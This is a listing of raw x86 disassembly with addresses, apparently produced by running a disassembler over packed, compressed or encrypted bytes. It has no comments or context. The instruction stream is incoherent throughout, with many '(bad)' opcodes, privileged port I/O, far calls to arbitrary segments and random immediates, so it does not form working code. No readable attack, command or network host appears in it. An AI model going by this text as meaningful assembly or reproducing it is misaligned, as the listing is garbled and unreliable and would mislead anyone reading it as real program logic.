  41a5e4:	enter  0x3066,0xc0
  41a5e8:	jle    0x41a63b
  41a5ea:	jecxz  0x41a609
  41a5ec:	pop    ss
  41a5ed:	and    al,0xbc
  41a5ef:	xchg   esi,eax
  41a5f0:	adc    BYTE PTR [ecx+edx*4+0x52],cl
  41a5f4:	xchg   BYTE PTR [eax-0x3c67b3ea],bl
  41a5fa:	in     eax,dx
  41a5fb:	mov    dl,0x4b
  41a5fd:	pop    ecx
  41a5fe:	sbb    BYTE PTR [eax-0x44],ah
  41a601:	dec    edx
  41a602:	mov    al,ds:0xd59edd3c
  41a607:	mov    cx,0xeaa4
  41a60b:	test   DWORD PTR [eax],0x940a97b3
  41a611:	mov    es,WORD PTR [ebx+0x56]
  41a614:	and    eax,0x4c3c0394
  41a619:	stc    
  41a61a:	fsubr  DWORD PTR [esi]
  41a61c:	xor    eax,0x6e34abea
  41a621:	sbb    eax,DWORD PTR [ebp-0x5c]
  41a624:	pushf  
  41a625:	ins    BYTE PTR es:[edi],dx
  41a626:	fs mov esp,0x7f046167
  41a62c:	xchg   esi,eax
  41a62d:	xchg   edx,eax
  41a62e:	adc    eax,0x7016df0e
  41a633:	jge    0x41a628
  41a635:	inc    esi
  41a636:	push   cs
  41a637:	pop    ss
  41a638:	mov    BYTE PTR [edx+0x70],ah
  41a63b:	(bad)  
  41a63c:	inc    ebx
  41a63d:	adc    ecx,DWORD PTR [ebp+0x3d403d2c]
  41a643:	repnz cmc 
  41a645:	sub    al,BYTE PTR [eax-0x23719443]
  41a64b:	pusha  
  41a64c:	xor    DWORD PTR [ebp+0x2cac632c],esi
  41a652:	mov    eax,0x41caca9c
  41a657:	ss pop esi
  41a659:	adc    ecx,ecx
  41a65b:	dec    BYTE PTR ds:0x2d442bad
  41a661:	xchg   esp,eax
  41a662:	sahf   
  41a663:	jg     0x41a69d
  41a665:	aad    0x75
  41a667:	out    0x70,eax
  41a669:	sar    DWORD PTR [esi],0xde
  41a66c:	pop    eax
  41a66d:	(bad)  
  41a66e:	pop    ebp
  41a66f:	call   0xb662:0xbd3a36c3
  41a676:	mov    ah,0xaf
  41a678:	add    BYTE PTR [esi],0xb0
  41a67b:	pop    es
  41a67c:	pop    ss
  41a67d:	ficom  DWORD PTR [ebp-0x18]
  41a680:	or     ah,BYTE PTR [ebp+0x54]
  41a683:	mov    BYTE PTR [ebx+0x6e],ch
  41a686:	popa   
  41a687:	loopne 0x41a65a
  41a689:	cmp    ch,bh
  41a68b:	mov    ecx,0xa6850cb
  41a690:	inc    esi
  41a691:	(bad)  
  41a693:	xor    al,BYTE PTR [esi+eiz*1+0x30]
  41a697:	cdq    
  41a698:	and    BYTE PTR [ecx-0x2dc8d7f7],al
  41a69e:	mov    cl,0x49
  41a6a0:	shl    BYTE PTR [edi],cl
  41a6a2:	popa   
  41a6a3:	shl    DWORD PTR [ebx-0x43],cl
  41a6a6:	nop
  41a6a7:	hlt    
  41a6a8:	stc    
  41a6a9:	cmp    al,0x5d
  41a6ab:	jmp    0x41a6f4
  41a6ad:	inc    edi
  41a6ae:	retf   0xc575
  41a6b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6b2:	call   FWORD PTR [ebx]
  41a6b4:	mov    eax,0xc7ffaa7b
  41a6b9:	dec    ebp
  41a6bb:	out    0x29,eax
  41a6bd:	outs   dx,BYTE PTR ds:[esi]
  41a6be:	inc    ebp
  41a6bf:	(bad)  
  41a6c1:	jmp    0x5b48bf6b
  41a6c6:	push   eax
  41a6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c8:	fisub  DWORD PTR [ebx]
  41a6ca:	out    0xaf,eax
  41a6cc:	adc    eax,0x1ffa235c
  41a6d1:	ret    
  41a6d2:	nop
  41a6d3:	arpl   ax,di
  41a6d5:	and    ch,BYTE PTR [edi]
  41a6d7:	jmp    0xbe1e3685
  41a6dc:	imul   eax,DWORD PTR [edx],0x6573871
  41a6e2:	xchg   esp,eax
  41a6e3:	fidiv  WORD PTR [ecx+0x4d5ab952]
  41a6e9:	je     0x41a673
  41a6eb:	shl    DWORD PTR [eax-0x2caefd70],cl
  41a6f1:	fs ret 
  41a6f3:	pop    ss
  41a6f4:	arpl   WORD PTR [edx-0x6d],sp
  41a6f7:	lea    edx,[edi+0x758e08ba]
  41a6fd:	outs   dx,DWORD PTR cs:[esi]
  41a6ff:	sub    eax,0x1738a739
  41a704:	mov    ah,0xa3
  41a706:	loope  0x41a776
  41a708:	fimul  WORD PTR [ecx+0x16]
  41a70b:	push   ds
  41a70c:	and    ebp,0xa08dc8b6
  41a712:	mov    edi,0xcce7fe8e
  41a717:	rcr    DWORD PTR [ebx+0x40],cl
  41a71a:	popf   
  41a71b:	test   ebp,eax
  41a71d:	mov    dl,0x82
  41a71f:	push   0x4db621ee
  41a724:	bound  edi,QWORD PTR [ecx]
  41a726:	das    
  41a727:	jle    0x41a773
  41a729:	stos   BYTE PTR es:[edi],al
  41a72a:	adc    eax,0x8f08f5cb
  41a72f:	cdq    
  41a730:	dec    ebp
  41a731:	pop    ss
  41a732:	out    dx,al
  41a733:	js     0x41a6bb
  41a735:	enter  0x660c,0x18
  41a739:	adc    BYTE PTR [esi-0x3e],al
  41a73c:	lock imul BYTE PTR gs:[eax]
  41a740:	popa   
  41a741:	call   0xdce846b
  41a746:	xchg   DWORD PTR [esp+ebp*8-0x70],esi
  41a74a:	cmc    
  41a74b:	or     eax,0x46703638
  41a750:	enter  0x5745,0xac
  41a754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a755:	mov    dl,0x24
  41a757:	(bad)  
  41a758:	mov    dl,BYTE PTR ds:0x7137ed3c
  41a75e:	call   0xc0b4:0x75a8ee22
  41a765:	std    
  41a766:	out    0xe8,al
  41a768:	cmp    al,0x9d
  41a76a:	outs   dx,BYTE PTR ds:[esi]
  41a76b:	inc    esi
  41a76c:	mov    ds:0x2b0168ca,al
  41a771:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a773:	xor    al,0xc1
  41a775:	shr    DWORD PTR [ebx],0x73
  41a778:	cmp    eax,0x8e43a87c
  41a77d:	or     BYTE PTR [ecx+0x5ddd464b],0x99
  41a784:	retf   
  41a785:	scas   al,BYTE PTR es:[edi]
  41a786:	inc    ecx
  41a787:	mov    ds:0xb149f1b8,al
  41a78c:	push   ds
  41a78d:	rcl    BYTE PTR [eax+0x1dce2c91],1
  41a793:	mov    al,0x39
  41a795:	jmp    0xab1ca845
  41a79a:	xchg   ebp,eax
  41a79b:	mov    al,0x52
  41a79d:	inc    eax
  41a79e:	(bad)  
  41a79f:	jne    0x41a76f
  41a7a1:	fwait
  41a7a2:	pop    eax
  41a7a3:	mov    cl,0xb3
  41a7a5:	jmp    0x6f2fd5e3
  41a7aa:	shl    DWORD PTR [ebx+edi*4],1
  41a7ad:	fucomp st(5)
  41a7af:	ret    
  41a7b0:	sbb    bl,cl
  41a7b2:	mov    DWORD PTR [eax],esp
  41a7b4:	ficomp WORD PTR [edi+0x2fa88b10]
  41a7ba:	mov    bl,0xcf
  41a7bc:	out    dx,al
  41a7bd:	test   eax,0xb179fc8c
  41a7c2:	sahf   
  41a7c3:	mov    ?,ebx
  41a7c5:	mov    bl,0xab
  41a7c7:	add    al,0xf6
  41a7c9:	outs   dx,DWORD PTR ds:[esi]
  41a7ca:	and    BYTE PTR [edi],0x66
  41a7cd:	iret   
  41a7ce:	mov    dh,0xe0
  41a7d0:	add    ecx,DWORD PTR [ebp+0x2e]
  41a7d3:	daa    
  41a7d4:	add    BYTE PTR [esi],al
  41a7d6:	or     ebp,DWORD PTR ds:0xff9ec6e
  41a7dc:	out    dx,eax
  41a7dd:	adc    ebp,DWORD PTR [esi+0x4612f6d0]
  41a7e3:	shufps xmm6,XMMWORD PTR [edi+eax*2-0xbd359b0],0xd0
  41a7ec:	push   ebp
  41a7ed:	cmp    al,0x9e
  41a7ef:	out    dx,eax
  41a7f0:	sbb    ah,ah
  41a7f2:	lds    ecx,FWORD PTR [esi]
  41a7f4:	inc    esp
  41a7f5:	xchg   esp,eax
  41a7f6:	pop    esp
  41a7f7:	sub    edi,esi
  41a7f9:	iret   
  41a7fa:	inc    ecx
  41a7fb:	fbld   TBYTE PTR [ebx+0x25d5491d]
  41a801:	cmp    al,0x17
  41a803:	or     ebp,DWORD PTR [esi-0x78]
  41a806:	nop
  41a807:	dec    edi
  41a808:	sbb    ebp,DWORD PTR [edx-0x78]
  41a80b:	sub    ebp,DWORD PTR [eax]
  41a80d:	lea    ebx,[ecx-0x20]
  41a810:	cmp    al,ah
  41a812:	xchg   edx,eax
  41a813:	inc    eax
  41a814:	adc    eax,DWORD PTR [ebp-0x5]
  41a817:	cmp    ecx,edi
  41a819:	lock mov cl,BYTE PTR [esi]
  41a81c:	fmul   QWORD PTR [edx-0x5b]
  41a81f:	dec    esp
  41a820:	das    
  41a821:	mov    WORD PTR [ebp+0x7f],gs
  41a824:	add    al,0x73
  41a826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a827:	jecxz  0x41a7c2
  41a829:	fdivr  QWORD PTR [ebx+0x6578dc5]
  41a82f:	jg     0x41a85a
  41a831:	cmp    ebp,DWORD PTR [ecx-0x61]
  41a834:	inc    ebp
  41a835:	ret    0x4595
  41a838:	mov    ah,0xeb
  41a83a:	xor    eax,0x93974298
  41a83f:	cs push ss
  41a841:	aam    0x6d
  41a843:	xor    esi,ebx
  41a845:	xor    al,0x86
  41a847:	repnz das 
  41a849:	sub    BYTE PTR [edx],dl
  41a84b:	adc    BYTE PTR [eax],cl
  41a84d:	mov    ?,WORD PTR [ebp-0x49]
  41a850:	or     eax,0xc436c8a5
  41a855:	xor    ebp,DWORD PTR [ebp+eiz*1+0x7fdb15d4]
  41a85c:	ret    0xb392
  41a85f:	call   0x4593:0xc46ccb63
  41a866:	sbb    al,0x5a
  41a868:	and    eax,0x4f05ffe9
  41a86d:	xchg   dh,bh
  41a86f:	xchg   edi,eax
  41a870:	or     DWORD PTR [esi-0x3b],edi
  41a873:	push   ebx
  41a874:	scas   al,BYTE PTR es:[edi]
  41a875:	(bad)  
  41a876:	cmp    eax,0x5b4ddcd0
  41a87b:	cs push cs
  41a87d:	dec    esp
  41a87e:	fidivr WORD PTR [ecx]
  41a880:	mov    ebx,0xd65e34e2
  41a885:	xchg   ecx,eax
  41a886:	xchg   ebx,eax
  41a887:	adc    cl,BYTE PTR [ecx+0x62]
  41a88a:	mov    ecx,?
  41a88c:	retf   
  41a88d:	add    DWORD PTR [ebp-0x7c68f60a],eax
  41a893:	stos   DWORD PTR es:[edi],eax
  41a894:	mov    bh,0xbe
  41a896:	adc    eax,edi
  41a898:	push   eax
  41a899:	sbb    esp,ebp
  41a89b:	inc    esi
  41a89c:	jns    0x41a8ee
  41a89e:	cwde   
  41a89f:	cld    
  41a8a0:	addr16 inc ebx
  41a8a2:	fistp  QWORD PTR [edi]
  41a8a4:	jno    0x41a8ef
  41a8a6:	or     DWORD PTR [ebp-0x61d0a1da],eax
  41a8ac:	push   ebp
  41a8ad:	push   ds
  41a8ae:	lods   eax,DWORD PTR ds:[esi]
  41a8af:	call   0x248d:0x541d8689
  41a8b6:	dec    esp
  41a8b7:	adc    eax,0x838fd7e
  41a8bc:	jno    0x41a8b8
  41a8be:	xor    BYTE PTR [ecx],ch
  41a8c0:	aad    0xb3
  41a8c2:	jae    0x41a8f7
  41a8c4:	sbb    eax,0x2b6caefa
  41a8c9:	push   eax
  41a8ca:	mov    edx,0xc68e25c4
  41a8cf:	fsubr  st(1),st
  41a8d1:	fnsave [edx+0x47]
  41a8d4:	loopne 0x41a8ed
  41a8d6:	sub    BYTE PTR [eax],bl
  41a8d8:	fs jns 0x41a85c
  41a8db:	cs aaa 
  41a8dd:	gs dec edx
  41a8df:	mov    esp,0x7a62a68a
  41a8e4:	icebp  
  41a8e5:	mov    eax,0x6df5aa80
  41a8ea:	call   0x67a7:0x53c5ee0f
  41a8f1:	pop    esi
  41a8f2:	sub    al,0xea
  41a8f4:	cmp    BYTE PTR [ebx-0x4ccb216c],bh
  41a8fa:	es or  al,0x5d
  41a8fd:	mov    BYTE PTR [esi],0x96
  41a900:	stos   DWORD PTR es:[edi],eax
  41a901:	(bad)  
  41a902:	and    BYTE PTR [ebp+0x5e4fbdae],ch
  41a908:	mov    WORD PTR [ebx+edi*1+0x58ef8221],gs
  41a90f:	or     dh,dh
  41a911:	and    BYTE PTR [edx-0x36f05621],bh
  41a917:	pop    ecx
  41a918:	mov    ebx,0x27bce881
  41a91d:	mov    eax,ds:0x2e3682d8
  41a922:	xchg   edi,eax
  41a923:	mov    ch,0x76
  41a925:	mov    WORD PTR [eax-0x72],gs
  41a928:	repz call FWORD PTR [esi-0x55]
  41a92c:	inc    ebp
  41a92d:	call   0x582b83e8
  41a932:	jmp    DWORD PTR [edi+ebp*8+0x6e2088df]
  41a939:	sub    al,0x32
  41a93b:	outs   dx,DWORD PTR ss:[esi]
  41a93d:	or     BYTE PTR [ebx+0x600b9927],0xcd
  41a944:	loop   0x41a903
  41a946:	cmp    DWORD PTR [esi],edi
  41a948:	jl     0x41a952
  41a94a:	stos   DWORD PTR es:[edi],eax
  41a94b:	repz dec esi
  41a94d:	cdq    
  41a94e:	adc    ch,dh
  41a950:	adc    DWORD PTR [edx+ebx*1],esi
  41a953:	sti    
  41a954:	pusha  
  41a955:	jmp    FWORD PTR [ebx+edx*2-0x7b]
  41a959:	push   ds
  41a95a:	inc    ecx
  41a95b:	and    al,0x9
  41a95d:	(bad)  
  41a95e:	nop
  41a95f:	mov    ebx,0x971cbf9
  41a964:	mov    ch,0x97
  41a966:	ja     0x41a994
  41a968:	in     al,dx
  41a969:	cld    
  41a96a:	stos   DWORD PTR es:[edi],eax
  41a96b:	dec    esp
  41a96c:	mov    cs,WORD PTR [ebp-0x66649793]
  41a972:	xchg   ebx,eax
  41a973:	and    edi,DWORD PTR [eax-0x3f]
  41a976:	js     0x41a967
  41a978:	sub    ebp,edx
  41a97a:	jbe    0x41a9e7
  41a97c:	in     al,0x9b
  41a97e:	mov    esi,0x33286675
  41a983:	scas   al,BYTE PTR es:[edi]
  41a984:	ins    BYTE PTR es:[edi],dx
  41a985:	cmp    ch,BYTE PTR [edx+0x2a3219f4]
  41a98b:	(bad)  
  41a98c:	data16 sbb al,0x4c
  41a98f:	push   ecx
  41a990:	push   ss
  41a991:	or     DWORD PTR [esi-0x7eb93c2],edx
  41a997:	repz push ebp
  41a999:	fnstsw WORD PTR [edi-0x44]
  41a99c:	xchg   ebp,eax
  41a99d:	add    BYTE PTR [ebx+0x9],ah
  41a9a0:	mov    cl,0xda
  41a9a2:	cs adc al,0x1f
  41a9a5:	jb     0x41a96f
  41a9a7:	cs loopne 0x41a975
  41a9aa:	jle    0x41aa0e
  41a9ac:	leave  
  41a9ad:	scas   al,BYTE PTR es:[edi]
  41a9ae:	sub    esp,ebx
  41a9b0:	es dec ecx
  41a9b2:	push   edx
  41a9b3:	push   edx
  41a9b4:	or     al,0xf6
  41a9b6:	or     eax,0xa1a58972
  41a9bb:	jge    0x41a96f
  41a9bd:	jg     0x41aa3b
  41a9bf:	adc    BYTE PTR fs:[esi+0x19c416e],bl
  41a9c6:	clc    
  41a9c7:	cmp    eax,0xdeaca46d
  41a9cc:	pop    es
  41a9cd:	in     eax,dx
  41a9ce:	ret    0x1cd
  41a9d1:	rol    BYTE PTR [edx-0x77],1
  41a9d4:	jbe    0x41a95e
  41a9d6:	mov    ds:0x5bb61925,al
  41a9db:	xor    al,0x4
  41a9dd:	mov    bl,0x24
  41a9df:	cdq    
  41a9e0:	or     al,BYTE PTR [eax+0x6c]
  41a9e3:	fstp   DWORD PTR [ebx]
  41a9e5:	mov    ecx,0x85bed815
  41a9ea:	in     al,dx
  41a9eb:	(bad)  
  41a9ec:	call   0x1302:0xfede841
  41a9f3:	call   0xd936060c
  41a9f8:	mov    dl,BYTE PTR [edi+edi*2]
  41a9fb:	(bad)  
  41a9fc:	loop   0x41aa31
  41a9fe:	outs   dx,DWORD PTR ds:[esi]
  41a9ff:	pop    es
  41aa00:	push   ebp
  41aa01:	xchg   esp,eax
  41aa02:	jb     0x41a98e
  41aa04:	fsubr  QWORD PTR [ebx+edx*4]
  41aa07:	cmp    esp,ebx
  41aa09:	lock out 0x17,al
  41aa0c:	and    eax,DWORD PTR [eax]
  41aa0e:	xchg   edi,eax
  41aa0f:	shl    BYTE PTR [edi+edi*8],cl
  41aa12:	xor    BYTE PTR [ebx+ebp*1+0x55],dl
  41aa16:	or     DWORD PTR [edi-0x35247773],eax
  41aa1c:	xor    eax,0x923be77f
  41aa21:	cwde   
  41aa22:	xor    ebp,0x4b
  41aa25:	mov    cl,0x4e
  41aa27:	ss dec esp
  41aa29:	jmp    0xa576:0xe2f32ddd
  41aa30:	jno    0x41aa83
  41aa32:	cmp    eax,0xd5b571a8
  41aa37:	cld    
  41aa38:	dec    esi
  41aa39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3a:	ins    BYTE PTR es:[edi],dx
  41aa3b:	mov    ah,0x2f
  41aa3d:	or     DWORD PTR [eax-0x7031c2d1],ebx
  41aa43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa44:	fs int 0xa2
  41aa47:	lods   al,BYTE PTR ds:[esi]
  41aa48:	mul    BYTE PTR [ecx+edx*4]
  41aa4b:	sbb    ecx,DWORD PTR [eax+esi*8-0x54]
  41aa4f:	and    eax,esp
  41aa51:	push   eax
  41aa52:	mov    ah,0x7
  41aa54:	adc    BYTE PTR [edi+0x375e0f4d],ch
  41aa5a:	sub    dh,BYTE PTR [ebx]
  41aa5c:	jmp    DWORD PTR [esi+0x53]
  41aa5f:	out    0x7d,al
  41aa61:	xor    al,0x82
  41aa63:	sti    
  41aa64:	sti    
  41aa65:	push   es
  41aa66:	sub    edi,eax
  41aa68:	add    al,0x55
  41aa6a:	xchg   ecx,eax
  41aa6b:	push   0xffffff92
  41aa6d:	add    dh,BYTE PTR [ebp-0x277ccfbf]
  41aa73:	hlt    
  41aa74:	daa    
  41aa75:	xchg   ebx,eax
  41aa76:	imul   edx,DWORD PTR [ebp+0x7158c317],0x9857efab
  41aa80:	in     eax,0x53
  41aa82:	mov    ebp,0xf2f93e2f
  41aa87:	rcl    cl,1
  41aa89:	pop    ss
  41aa8a:	mov    eax,ds:0x363a51d8
  41aa8f:	outs   dx,DWORD PTR ds:[esi]
  41aa90:	ins    DWORD PTR es:[edi],dx
  41aa91:	(bad)  [esi+0x28]
  41aa94:	mov    bl,0xa0
  41aa96:	adc    BYTE PTR [esi-0x69d69e58],bl
  41aa9c:	div    esi
  41aa9e:	retf   
  41aa9f:	lods   al,BYTE PTR ds:[esi]
  41aaa0:	adc    DWORD PTR [esi+0x224ba402],0xffffffe6
  41aaa7:	xor    al,0x19
  41aaa9:	call   0x36a3:0xa297cde5
  41aab0:	(bad)  
  41aab2:	(bad)  
  41aab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab4:	add    al,0x6e
  41aab6:	xchg   ecx,eax
  41aab7:	fidiv  WORD PTR [eax+0x76]
  41aaba:	xchg   edx,eax
  41aabb:	adc    eax,0x52d78121
  41aac0:	jno    0x41aaab
  41aac2:	fstp   TBYTE PTR [ecx-0x58427f42]
  41aac8:	lahf   
  41aac9:	pop    edx
  41aaca:	jne    0x41aaf9
  41aacc:	mov    DWORD PTR [ebx-0x3],eax
  41aacf:	xchg   edx,eax
  41aad0:	pmaxub mm6,mm7
  41aad3:	inc    ecx
  41aad4:	or     al,BYTE PTR [ecx+edx*8]
  41aad7:	jge    0x41aaa0
  41aad9:	jb     0x41aa87
  41aadb:	popf   
  41aadc:	stos   DWORD PTR es:[edi],eax
  41aadd:	add    edx,DWORD PTR [eax+0x16cb482a]
  41aae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aae4:	add    bl,BYTE PTR [edi-0x48]
  41aae7:	int3   
  41aae8:	test   eax,0xd8460502
  41aaed:	icebp  
  41aaee:	cdq    
  41aaef:	fld    QWORD PTR [esi-0x54]
  41aaf2:	test   eax,0x141e9758
  41aaf7:	push   eax
  41aaf8:	(bad)  [ebx]
  41aafa:	ret    0x3df4
  41aafd:	aaa    
  41aafe:	xchg   esp,eax
  41aaff:	dec    ebp
  41ab00:	es test al,0xa9
  41ab03:	mov    edi,DWORD PTR [ebx+0x24dd67fa]
  41ab09:	mov    ?,WORD PTR [ebx+0x37f95ba4]
  41ab0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab10:	mov    dh,0x5d
  41ab12:	dec    ecx
  41ab13:	add    esi,DWORD PTR [eax-0x5cc5102c]
  41ab19:	popa   
  41ab1a:	mov    eax,0xc52e13ed
  41ab1f:	xchg   ecx,eax
  41ab20:	mov    dh,0xbe
  41ab22:	xchg   DWORD PTR [eax+0x74],edi
  41ab25:	mov    ah,0x89
  41ab27:	les    esi,FWORD PTR [eax+0x54]
  41ab2a:	mov    ch,0xbf
  41ab2c:	add    ebx,DWORD PTR [ecx-0x27f1ed3b]
  41ab32:	popf   
  41ab33:	xlat   BYTE PTR ds:[ebx]
  41ab34:	(bad)  
  41ab35:	jbe    0x41aac6
  41ab37:	hlt    
  41ab38:	jae    0x41ab51
  41ab3a:	repnz mov ecx,0xe7223edd
  41ab40:	stc    
  41ab41:	gs inc ebp
  41ab43:	lahf   
  41ab44:	cmp    al,0x9b
  41ab46:	call   0xd69c:0x6be1939f
  41ab4d:	adc    eax,0x90d0ecb0
  41ab52:	adc    BYTE PTR [eax+edi*2],cl
  41ab55:	aad    0xd2
  41ab57:	shr    BYTE PTR [esi+0x74],0x58
  41ab5b:	xor    al,0xed
  41ab5d:	idiv   esp
  41ab5f:	mov    bl,0x2a
  41ab61:	push   esp
  41ab62:	push   esp
  41ab63:	xor    cl,BYTE PTR [ebp+0x5265863d]
  41ab69:	in     eax,0xdd
  41ab6b:	imul   ebp,DWORD PTR [eax],0x51
  41ab6e:	inc    ebx
  41ab6f:	push   esi
  41ab70:	inc    edi
  41ab71:	dec    edi
  41ab72:	xor    al,0xe5
  41ab74:	inc    esp
  41ab75:	sub    eax,0xbfd9293d
  41ab7a:	fiadd  WORD PTR [esi-0xee2c00f]
  41ab80:	mov    ebp,0x41f13e76
  41ab85:	pextrw edx,(bad),0xc5
  41ab87:	adc    DWORD PTR [ebx+0x79],edx
  41ab8a:	das    
  41ab8b:	sbb    BYTE PTR [ebp-0x27f98fe6],dh
  41ab91:	rol    BYTE PTR [esi+0x7b01631],0xa4
  41ab98:	jb     0x41ab90
  41ab9a:	dec    esi
  41ab9b:	add    DWORD PTR [edi-0x42],esp
  41ab9e:	addr16 leave 
  41aba0:	gs popf 
  41aba2:	adc    ah,BYTE PTR [ebp-0x12b33d14]
  41aba8:	mov    dl,0xe2
  41abaa:	or     DWORD PTR [ecx+0xd],ebp
  41abad:	loop   0x41ac2e
  41abaf:	nop
  41abb0:	fldcw  WORD PTR [eax]
  41abb2:	icebp  
  41abb3:	mov    esi,0xf872381a
  41abb8:	scas   al,BYTE PTR es:[edi]
  41abb9:	pop    ss
  41abba:	fstp   DWORD PTR [edi+0x5a1a3d47]
  41abc0:	(bad)  
  41abc1:	lea    ebx,[ebx+edx*8]
  41abc4:	stc    
  41abc5:	dec    ecx
  41abc6:	push   ebx
  41abc7:	sar    BYTE PTR [edx+0x8],0xe1
  41abcb:	test   eax,0xdf34c492
  41abd0:	dec    edi
  41abd1:	sbb    al,BYTE PTR [edx+ebp*1+0x384f879f]
  41abd8:	mov    bh,0x5
  41abda:	inc    ebx
  41abdb:	outs   dx,DWORD PTR ds:[esi]
  41abdc:	adc    esp,ecx
  41abde:	pop    esi
  41abdf:	mov    ds:0xa4a9141f,eax
  41abe4:	mov    al,0x4a
  41abe6:	jne    0x41abf2
  41abe8:	jl     0x41ab82
  41abea:	scas   eax,DWORD PTR es:[edi]
  41abeb:	add    DWORD PTR [ebx+0x2],ecx
  41abee:	hlt    
  41abef:	sub    eax,0x4a014a79
  41abf4:	das    
  41abf5:	push   0xffffffe2
  41abf7:	jnp    0x41abf3
  41abf9:	popa   
  41abfa:	jo     0x41abc9
  41abfc:	std    
  41abfd:	ss das 
  41abff:	dec    esi
  41ac00:	xor    eax,0xc24ec761
  41ac05:	popf   
  41ac06:	gs or  al,0xd9
  41ac09:	pop    edi
  41ac0a:	es mov esi,0x2460bd3
  41ac10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac11:	sub    al,0x9d
  41ac13:	mov    bh,0xce
  41ac15:	loopne 0x41ac50
  41ac17:	cmp    DWORD PTR [ebp-0x2c],0xffffffd1
  41ac1b:	std    
  41ac1c:	not    DWORD PTR [edi]
  41ac1e:	clc    
  41ac1f:	shl    bl,1
  41ac21:	dec    edi
  41ac22:	push   0x18
  41ac24:	in     al,0x59
  41ac26:	jmp    0x1277:0x8368213c
  41ac2d:	mov    ah,0xdc
  41ac2f:	add    bh,cl
  41ac31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac32:	cli    
  41ac33:	call   0x31ea:0x90f18694
  41ac3a:	sbb    esp,edx
  41ac3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac3d:	push   0xc93d7e5e
  41ac42:	stc    
  41ac43:	daa    
  41ac44:	or     al,0xc7
  41ac46:	fistp  WORD PTR [esi]
  41ac48:	sbb    BYTE PTR [ecx+0x7e0d7d33],dh
  41ac4e:	daa    
  41ac4f:	push   0xffffffba
  41ac51:	cdq    
  41ac52:	lahf   
  41ac53:	push   0xffffff90
  41ac55:	out    0x70,eax
  41ac57:	jne    0x41ac9d
  41ac59:	popf   
  41ac5a:	(bad)  
  41ac5c:	fist   DWORD PTR [edx]
  41ac5e:	ficom  DWORD PTR [esi+eiz*4+0x3ea2a080]
  41ac65:	adc    eax,0xaabdb219
  41ac6a:	ja     0x41ac52
  41ac6c:	out    dx,al
  41ac6d:	dec    ecx
  41ac6e:	xchg   ebx,eax
  41ac6f:	add    DWORD PTR [esi],ecx
  41ac71:	xchg   esp,eax
  41ac72:	lods   al,BYTE PTR ds:[esi]
  41ac73:	xor    DWORD PTR [ecx+0x3032e59f],0x994f5c99
  41ac7d:	pop    ds
  41ac7e:	sti    
  41ac7f:	sub    bh,dl
  41ac81:	mov    bh,0x8d
  41ac83:	cmp    bh,ch
  41ac85:	sub    BYTE PTR [ecx],0x92
  41ac88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac89:	(bad)  
  41ac8a:	push   ds
  41ac8b:	mov    al,0xed
  41ac8d:	mov    dl,0x26
  41ac8f:	adc    al,0x93
  41ac91:	cmp    BYTE PTR [eax],0xbf
  41ac94:	loope  0x41acc8
  41ac96:	pop    ds
  41ac97:	mov    al,0xda
  41ac99:	rcr    DWORD PTR [ebx-0x4585b6a7],1
  41ac9f:	(bad)  
  41aca1:	inc    esp
  41aca2:	push   ss
  41aca3:	inc    ebx
  41aca4:	or     dh,BYTE PTR [esp+ebp*2+0x7c403f54]
  41acab:	xor    al,0x19
  41acad:	mov    dh,0xad
  41acaf:	dec    ecx
  41acb0:	je     0x41acc7
  41acb2:	and    BYTE PTR [esi],ah
  41acb4:	ret    
  41acb5:	xor    al,0xa6
  41acb7:	fwait
  41acb8:	and    esi,esi
  41acba:	or     edx,DWORD PTR ss:[ebp-0x74a82fc]
  41acc1:	mov    ch,ah
  41acc3:	push   0x30
  41acc5:	int    0x4f
  41acc7:	inc    eax
  41acc8:	xchg   esi,eax
  41acc9:	sbb    bl,BYTE PTR [ecx-0x37a4458f]
  41accf:	loopne 0x41acd2
  41acd1:	sub    al,0x19
  41acd3:	shl    DWORD PTR [edx+0x66],cl
  41acd6:	xlat   BYTE PTR ds:[ebx]
  41acd7:	stc    
  41acd8:	dec    esp
  41acd9:	popa   
  41acda:	shl    DWORD PTR [ecx+0x77b1c9b7],1
  41ace0:	xchg   BYTE PTR ds:0x6b8ced5f,bh
  41ace6:	call   0x773a:0x21b44f4d
  41aced:	dec    esi
  41acee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acef:	test   al,dh
  41acf1:	jl     0x41ac75
  41acf3:	iret   
  41acf4:	test   DWORD PTR [esi+0x6f65373a],ebp
  41acfa:	xlat   BYTE PTR ds:[ebx]
  41acfb:	push   ecx
  41acfc:	cmp    edi,ebp
  41acfe:	pushf  
  41acff:	loop   0x41aca2
  41ad01:	pop    ebp
  41ad02:	clc    
  41ad03:	sbb    ah,bh
  41ad05:	mov    ah,0x32
  41ad07:	mov    DWORD PTR [esi+0x23229c4],eax
  41ad0d:	jp     0x41ace2
  41ad0f:	jg     0x41ad36
  41ad11:	inc    edi
  41ad12:	pop    es
  41ad13:	jno    0x41ad2c
  41ad15:	sbb    BYTE PTR [edx],ah
  41ad17:	lahf   
  41ad18:	packuswb mm2,QWORD PTR [ebx+0x113bf035]
  41ad1f:	lahf   
  41ad20:	adc    eax,0xf90df577
  41ad25:	aam    0x6
  41ad27:	push   ecx
  41ad28:	rcl    DWORD PTR [eax],1
  41ad2a:	mov    ah,cl
  41ad2c:	in     al,dx
  41ad2d:	mov    ch,0x0
  41ad2f:	or     al,0x3b
  41ad31:	sbb    eax,0xf89f224
  41ad36:	push   ds
  41ad37:	adc    BYTE PTR cs:[eax-0x36],dl
  41ad3b:	leave  
  41ad3c:	push   edx
  41ad3d:	hlt    
  41ad3e:	js     0x41ada8
  41ad40:	mov    eax,esi
  41ad42:	test   eax,0x25066138
  41ad47:	cmp    eax,0xe39ad868
  41ad4c:	mov    ch,0x11
